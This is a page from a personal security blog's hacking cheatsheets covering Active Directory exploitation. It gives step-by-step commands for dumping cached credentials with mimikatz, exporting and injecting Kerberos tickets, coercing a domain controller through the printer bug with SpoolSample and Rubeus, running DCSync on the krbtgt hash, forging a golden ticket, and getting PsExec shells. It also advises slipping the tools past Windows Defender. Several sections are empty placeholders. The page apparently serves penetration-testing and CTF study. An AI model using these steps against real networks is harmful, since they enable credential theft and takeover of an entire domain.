<head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Exploitation</title><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></head><header><div id=brand><a class=icon-link href=https://ceso.github.io/><img class=icon src=https://ceso.github.io/images/site/logo.svg></a><div class=text><a href=https://ceso.github.io/ class=site-title>Ceso Adventures</a><h3>Blogs, Security CTFs & Tutorials</h3></div></div><nav><a href=https://ceso.github.io/><b>Home</b></a>
|
<a href=https://ceso.github.io/whoami/><b>Whoami</b></a>
|
<a href=https://ceso.github.io/posts/><b>Posts</b></a>
|
<a href=https://ceso.github.io/cheatsheets/><b>Cheatsheets</b></a>
|
<a href=https://ceso.github.io/resources><b>Resources</b></a>
|
<a href=https://ceso.github.io/videos><b>Videos</b></a>
|
<a href=https://ceso.github.io/categories/><b>Categories</b></a>
|
<a href=https://ceso.github.io/tags/><b>Tags</b></a>
|
<a href=https://ceso.github.io/index.xml><b>RSS</b></a></nav><hr></header><div class=wrap><nav class=sidebar aria-label="Table of contents"><h2>Cheatsheets</h2><details open><summary>Hacking</summary><div class=children><details open><summary>Active Directory</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/bloodhound/>BloodHound
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/exploitation/ class=current>Exploitation
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/permissions/>Permissions: ACE/SDDL - Format
</a><a href=https://ceso.github.io/cheatsheets/hacking/active_directory/powerview/>PowerView - methods for enumeration</a></div></details><details><summary>Antivirus Bypassing</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/readme/>README !
</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/amsi/>AMSI
</a><a href=https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/>Signature/Heuristics</a></div></details><details><summary>Enumeration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/login_cifs_winrm_pssesion/>Login through CIFS/WinRM/PSSession
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/networking/>Networking
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/samba/>Samba
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/>Useful Wordlists
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/>Web directorie/file scanner
</a><a href=https://ceso.github.io/cheatsheets/hacking/enumeration/windows/>Windows</a></div></details><details><summary>Exfiltration</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/ftp/>FTP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/http/>HTTP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/rdp/>RDP
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/samba/>Samba
</a><a href=https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/>Sockets</a></div></details><details><summary>Good to know</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/compiling/>Compiling
</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/misc/>Misc
</a><a href=https://ceso.github.io/cheatsheets/hacking/good_to_know/web/>Web</a></div></details><details><summary>Memory Exploitation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/memory_exploitation/simple_buffer_overflow/>(Simple) Buffer Overflow (32 bits, NO ASLR and NO DEP)</a></div></details><details><summary>Pivoting</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/readme/>README !
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/chisel/>Chisel
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/metasploit/>Metasploit
</a><a href=https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/>sshuttle</a></div></details><details><summary>Privilege Escalation</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/linux/>Linux
</a><a href=https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/>Windows</a></div></details><details><summary>Reverse Shells</summary><div class=children><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/bash/>Bash
</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/metasploit/>Metasploit
</a><a href=https://ceso.github.io/cheatsheets/hacking/reverse_shellls/php/>PHP</a></div></details></div></details><hr style="border:none;border-top:1px solid rgba(255,255,255,3%);margin:12px 0"><div style=padding:8px;color:#9aa4b2;font-size:13px>I wuv cheese :D</div></nav><main><header class=page-title><h1>Exploitation</h1></header><article><h1 id=list-all-available-credentials-cached-hashes-and-passwords-logged-on-user-and-computer>List all available credentials cached (Hashes and Passwords; Logged on user and computer)</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>mimikatz.exe &#34;sekurlsa::logonpasswords&#34; exit
</span></span></code></pre></div><hr><h1 id=convert-to-ccache>Convert to ccache</h1><p>We can use the tool <code>ticket_converter</code> written by <code>zer1t0</code> for converting kirbi tickets to ccache and viceversa:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>Convert from b64 encoded blob to kirbi:
</span></span><span style=display:flex><span>  [IO.File]::WriteAllBytes(&#34;C:\fullpathtoticket.kirbi&#34;, [Convert]::FromBase64String(&#34;aa…&#34;))
</span></span><span style=display:flex><span>Convert the .kiribi to .ccache:
</span></span><span style=display:flex><span>  python ticket_converter.py ticket.ccache ticket.kirbi
</span></span><span style=display:flex><span>Copy the ccache to our attacker machine and export the KRB5CCNAME variable:
</span></span><span style=display:flex><span>  export KRB5CCNAME=/path/to/ticket.ccache
</span></span></code></pre></div><hr><h1 id=genericall>GenericAll</h1><p>_TODO</p><hr><h1 id=genericwrite>GenericWrite</h1><p>_TODO</p><hr><h1 id=writedacl>WriteDACL</h1><p>_TODO</p><hr><h1 id=unconstrained-delegation>Unconstrained Delegation</h1><p>We have local adminstrative access to a host which is configured for Kerberos Unconstrained Delegation.
We can leverage Rubeus for an auth from the DC and then steal the TGT, this can be used to perform a DCSync to obtain the NTLM hash for ANY account.
Other way is by triggering the printer bug on a domain controller to coerce to authenticate to the host compromised we have using it&rsquo;s machine account.</p><p>If a computer account has <code>TRUSTED_FOR_DELEGATION</code> in it&rsquo;s UserAccountControl (UAC), then it&rsquo;s a viable target.
Domain controllers will also have <code>SERVER_TRUST_ACCOUNT_UAC</code>, so&mldr;if it the machine has this, then it&rsquo;s a DC.</p><h2 id=by-forwardable-tgt-after-login>By Forwardable TGT after login</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>1 - Enumerate if there if there is unconstrained delegation
</span></span><span style=display:flex><span>2 - If there is, open mimikatz (commands blow are inside it)
</span></span><span style=display:flex><span>3 - privilege::debug &lt;-- Enable debug
</span></span><span style=display:flex><span>4 - sekurlsa::tickets &lt;-- List all the present tickets
</span></span><span style=display:flex><span>5 - Through phishing or visit of a page, if the user has Windows Auth then it will use kerberos
</span></span><span style=display:flex><span>6 - sekurlsa::tickets &lt;-- Verify if there are new TGT&#39;s
</span></span><span style=display:flex><span>7 - sekurlsa::tickets /export &lt;-- If new TGT and marked as forwardable export them to disk
</span></span><span style=display:flex><span>8 - kerberos::ptt /inject:&lt;some-exported-tkt-file.kirbi&gt; &lt;-- Inject the exported ticket into memory
</span></span><span style=display:flex><span>9 - C:\Windows\Temp\PsExec.exe \\example.com cmd &lt;-- Try to get a cmd shell in example.com by leveraging injected ticket
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>* By default every user allows their TGT to be delegated, but high privilege users can be added to the group &#34;Protected Users Group&#34; to disable it, it also can break the application for which at the beggining unconstrained delegation was enabled for those users
</span></span></code></pre></div><h2 id=by-using-of-spoolsampleexe-printer-bug>By using of SpoolSample.exe (printer bug)</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>1 - Download and compile SpoolSample in a dev machine, it can be downloaded from: https://github.com/leechristensen/SpoolSample
</span></span><span style=display:flex><span>2 - Download and compile Rubeus in a dev machine, it can be downloaded from: https://github.com/GhostPack/Rubeus
</span></span><span style=display:flex><span>3 - Find a way to upload SpoolSample and Rubeus without being detected (for example, disabling Windows Defender, or injecting them into memory through reflection for example), for ease of the technique, all below is just written to disk
</span></span><span style=display:flex><span>4 - Rubeus.exe monitor /interval:5 /filteruser:DC01$ &lt;-- Monitor for TGTs originated in the DC01 machine. THIS MUST BE RUN FROM A DIFFERENT SHELL THAN THE ONE USED FOR THE NEXT STEP
</span></span><span style=display:flex><span>5 - SpoolSample.exe DC01 VICTIM01 &lt;-- Leverage &#34;RpcOpenPrinter&#34; and &#34;RpcRemoteFindFirstPrinterChangeNotification&#34; to get a notif
</span></span><span style=display:flex><span>6 - Rubeus.exe ptt /ticket:&lt;b64-from-rubeus-monitor&gt; &lt;-- Inject into memory the b64 ticket obtained by monitoring for tickets from DC01 to VICTIM01
</span></span><span style=display:flex><span>7 - lsadump::dcsync /domain:example.com /user:example\krbtgt &lt;-- Dump the NTLM hash of the krbtgt user by leveraging the just injected ticket (It could also be possible to dump the hash of the pass of a member from the &#34;Domain Admins&#34; group). THIS IS RUN FROM INSIDE MIMIKATZ
</span></span><span style=display:flex><span>8 - kerberos::golden /user:krbtgt /domain:example.com /sid:&lt;sid-showed-in-dcsync or obtained by PowerView&gt; /rc4:&lt;ntlm-hash-dumped-with-dcsync&gt; /ptt &lt;-- Craft a golden ticket and inject it into memory
</span></span><span style=display:flex><span>9 - dir \\dc01\\c$ &lt;-- Verify read access on dc01
</span></span><span style=display:flex><span>10 - misc::cmd &lt;-- Open cmd prompt from inside Mimikatz
</span></span><span style=display:flex><span>11 - C:\Windows\Temp\PsExec.exe -accepteula \\dc01 cmd &lt;-- Get a shell on dc01 by leveraging the golden ticket injected
</span></span></code></pre></div><hr><h1 id=constrained-delegation>Constrained Delegation</h1><p>We have compromised a computer/user account configured for Constrained Delegation (ie, the account&rsquo;s UserAccountControl attribute contains the value <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>). If it is, it&rsquo;s A MUST to look also after <code>msDS-AllowedToDelegateTo</code> account&rsquo;s property, this will have one or more hostnames/SPNs where our account will be allowed to impersonate any (non-sensitive/unproctected) user in the domain.</p><p>We have 2 scenarios where we can have Constrained Delegation:</p><ul><li>1 - We have command execution in the account in question, but not know the password for it</li><li>2 - We know the NTLM hash, or at least can get the hash from the NTLM hash</li></ul><hr><h1 id=resource-based-constrained-delegation-rbcd>Resource-Based Constrained Delegation (RBCD)</h1><p>Only found if we are working on an envrionment which is running domain controllers with Windows Server 2012 or higher.
This one is complex than the Unconstrained/Constrained.</p><p>The scenarios where we can leverage this are:</p><ul><li>1 - Computer/User account compromised listed in another computer account&rsquo;s msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Used to leverage ANY user account on the host which has the property</li><li>2 - Computer/User account which has GenericWrite to another computer account in the domain, can be leveraged to add the account compromised to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target and afterwards impersonate ANY user account.</li><li>3 - We don&rsquo;t have credentials, but we can get to relay a hash with responder/impacket-ntlmrelayx/mitm6 to LDAP and create a new computer account and add it to the msDS-AllowedToActOnBehalfOfOtherIdentity property. Later on impersonate any user.</li></ul><hr></article></main></div></body><footer><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://ceso.github.io/css/wiki.css></footer><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
|
<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
|
<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
<a href=http://www.gohugo.io/>Hugo</a> by ceso,
using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
which was influenced by the theme
<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer>